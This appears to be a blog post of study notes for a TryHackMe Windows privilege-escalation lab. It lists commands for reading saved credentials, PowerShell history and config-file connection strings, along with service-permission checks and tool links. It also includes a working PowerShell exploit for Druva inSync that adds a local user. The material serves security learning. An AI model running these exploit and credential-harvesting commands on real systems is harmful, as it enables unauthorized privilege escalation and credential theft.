---
date: 2023-10-15
linktitle: windPV-thm
title: TryHackMe - Windows Privilege Escalation
showreadingtime: true
tags: ['THM']
categories: ['THM']
---

## [THM-Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
#### Enumeration and Information Gathering
- Windows Pro - Uses **Bitlocker** encryption
- Find Account details using the command: **lusrmgr.msc**
- The **SYSTEM** account has more privileges than the Administrator user
##### Powershell History:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
##### Saved Windows Credentials:
```
cmdkey /list
runas /savecred /user:admin cmd.exe
```
##### IIS Configuration
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
##### Retrieve Credentials
###### Example Software:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
##### Scheduled Tasks
```
schtasks /query /tn vulntask /fo list /v
```
##### File permissions of exe
```
icacls c:\tasks\schtask.bat
```
##### Windows Services
```
sc qc apphostsvc
```
> apphostsvc - example command to check service config
#### Abusing Service Misconfiguration
Services have a **Discretionary Access Control List** (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

- All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\`
#### Unquoted Service Paths
```
sc qc "disk sorter enterprise"
```
#### Insecure Service Permissions
```
accesschk64.exe -qlc thmservice
```
##### Windows Privileges
```
whoami /priv
```

> **Tool:** https://github.com/gtworek/Priv2Admin

> **Official Doc:** https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

##### SeBackup and SeRestore
> Awesome command exploitation tbh
#### Abusing Vulnerable Software

```
wmic product get name,version,vendor
```

> **Exploit Code:**

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Tools:
1. [WinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
2. [PrivCheck](https://github.com/itm4n/PrivescCheck): 
3. [WES-NG: Windows Exploit Suggester](https://github.com/bitsadmin/wesng)

### Resources:
1. [Windows Local Priv-Esc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
2. [Token Kidanapping](https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf)
3. [Decoder](https://decoder.cloud/)
4. [Potates Windows Priv](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
5. [RoguesWinRM](https://github.com/antonioCoco/RogueWinRM)
6. [Priv2Admin](https://github.com/gtworek/Priv2Admin)
7. [Payload of Things - Windows Privs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)